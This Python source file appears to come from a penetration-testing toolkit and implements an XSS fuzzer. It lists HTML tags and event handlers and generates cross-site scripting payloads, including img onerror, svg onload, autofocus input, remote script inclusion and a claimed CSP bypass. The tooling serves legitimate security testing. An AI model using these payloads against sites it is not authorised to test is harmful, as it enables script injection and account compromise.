#!/usr/bin/env python
# -*- coding: utf-8 -*-

from saker.fuzzers.fuzzer import Fuzzer

_tags = [
    'a',
    'abbr',
    'acronym',
    'address',
    'applet',
    'area',
    'article',
    'aside',
    'audio',
    'b',
    'base',
    'basefont',
    'bdi',
    'bdo',
    'bgsound',
    'big',
    'blink',
    'blockquote',
    'body',
    'br',
    'button',
    'canvas',
    'caption',
    'center',
    'cite',
    'code',
    'col',
    'colgroup',
    'command',
    'content',
    'data',
    'datalist',
    'dd',
    'del',
    'details',
    'dfn',
    'dialog',
    'dir',
    'div',
    'dl',
    'dt',
    'element',
    'em',
    'embed',
    'fieldset',
    'figcaption',
    'figure',
    'font',
    'footer',
    'form',
    'frame',
    'frameset',
    'h1',
    'h2',
    'h3',
    'h4',
    'h5',
    'h6',
    'head',
    'header',
    'hgroup',
    'hr',
    'html',
    'i',
    'iframe',
    'image',
    'img',
    'input',
    'ins',
    'isindex',
    'kbd',
    'keygen',
    'label',
    'layer',
    'legend',
    'li',
    'link',
    'listing',
    'main',
    'map',
    'mark',
    'marquee',
    'menu',
    'menuitem',
    'meta',
    'meter',
    'multicol',
    'nav',
    'nobr',
    'noembed',
    'noframes',
    'nolayer',
    'noscript',
    'object',
    'ol',
    'optgroup',
    'option',
    'output',
    'p',
    'param',
    'picture',
    # 'plaintext',
    'pre',
    'progress',
    'q',
    'rp',
    'rt',
    'rtc',
    'ruby',
    's',
    'samp',
    'script',
    'section',
    'select',
    'shadow',
    'small',
    'source',
    'spacer',
    'span',
    'strike',
    'strong',
    'style',
    'sub',
    'summary',
    'sup',
    'table',
    'tbody',
    'td',
    'template',
    'textarea',
    'tfoot',
    'th',
    'thead',
    'time',
    'title',
    'tr',
    'track',
    'tt',
    'u',
    'ul',
    'var',
    'video',
    'wbr',
    'xmp',
]

_events = [
    'onabort',
    'onautocomplete',
    'onautocompleteerror',
    'onafterscriptexecute',
    'onanimationend',
    'onanimationiteration',
    'onanimationstart',
    'onbeforecopy',
    'onbeforecut',
    'onbeforeload',
    'onbeforepaste',
    'onbeforescriptexecute',
    'onbeforeunload',
    'onbegin',
    'onblur',
    'oncanplay',
    'oncanplaythrough',
    'onchange',
    'onclick',
    'oncontextmenu',
    'oncopy',
    'oncut',
    'ondblclick',
    'ondrag',
    'ondragend',
    'ondragenter',
    'ondragleave',
    'ondragover',
    'ondragstart',
    'ondrop',
    'ondurationchange',
    'onend',
    'onemptied',
    'onended',
    'onerror',
    'onfocus',
    'onfocusin',
    'onfocusout',
    'onhashchange',
    'oninput',
    'oninvalid',
    'onkeydown',
    'onkeypress',
    'onkeyup',
    'onload',
    'onloadeddata',
    'onloadedmetadata',
    'onloadstart',
    'onmessage',
    'onmousedown',
    'onmouseenter',
    'onmouseleave',
    'onmousemove',
    'onmouseout',
    'onmouseover',
    'onmouseup',
    'onmousewheel',
    'onoffline',
    'ononline',
    'onorientationchange',
    'onpagehide',
    'onpageshow',
    'onpaste',
    'onpause',
    'onplay',
    'onplaying',
    'onpopstate',
    'onprogress',
    'onratechange',
    'onreset',
    'onresize',
    'onscroll',
    'onsearch',
    'onseeked',
    'onseeking',
    'onselect',
    'onselectionchange',
    'onselectstart',
    'onstalled',
    'onstorage',
    'onsubmit',
    'onsuspend',
    'ontimeupdate',
    'ontoggle',
    'ontouchcancel',
    'ontouchend',
    'ontouchmove',
    'ontouchstart',
    'ontransitionend',
    'onunload',
    'onvolumechange',
    'onwaiting',
    'onwebkitanimationend',
    'onwebkitanimationiteration',
    'onwebkitanimationstart',
    'onwebkitfullscreenchange',
    'onwebkitfullscreenerror',
    'onwebkitkeyadded',
    'onwebkitkeyerror',
    'onwebkitkeymessage',
    'onwebkitneedkey',
    'onwebkitsourceclose',
    'onwebkitsourceended',
    'onwebkitsourceopen',
    'onwebkitspeechchange',
    'onwebkittransitionend',
    'onwheel'
]

_htmlTemplate = '''
<!DOCTYPE html>
<html>
<head>
    <title>XSS Fuzzer</title>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
</head>
<body>
%s
</body>
</html>
'''


class XSS(Fuzzer):

    """generate XSS payload"""

    tags = _tags
    events = _events
    htmlTemplate = _htmlTemplate

    def __init__(self, url=""):
        """
        url: xss payload url
        """
        super(XSS, self).__init__()
        self.url = url

    @classmethod
    def alterTest(cls, p=False):
        return "<script>alert(/xss/)</script>"

    @classmethod
    def genTestHTML(cls):
        s = ''
        for t in cls.tags:
            s += '<%s src="x"' % t
            for e in cls.events:
                s += ''' %s="console.log('%s %s')" ''' % (e, t, e)
            s += '>%s</%s>\n' % (t, t)
        return cls.htmlTemplate % s

    def img(self, payload):
        return '<img/onerror="%s"/src=x>' % payload

    def svg(self, payload):
        return '<svg/onload="%s"/>' % payload

    def style(self, payload):
        return '<style/onload="%s"></style>' % payload

    def input(self, payload):
        return '<input/onfocus="%s"/autofocus>' % payload

    def marquee(self, payload):
        return '<marquee/onstart="%s"></marquee>' % payload

    def div(self, payload):
        return '<div/onwheel="%s"/style="height:200%;width:100%"></div>' % payload

    def script(self):
        payload = "<script src='%s'></script>" % self.url
        return payload

    def event(self, element, src, event, js):
        payload = "<%s src=" % element
        payload += '"%s" ' % src
        payload += event
        payload += "=%s >" % js
        return payload

    def cspBypass(self):
        return "<link rel='preload' href='%s'>" % self.url
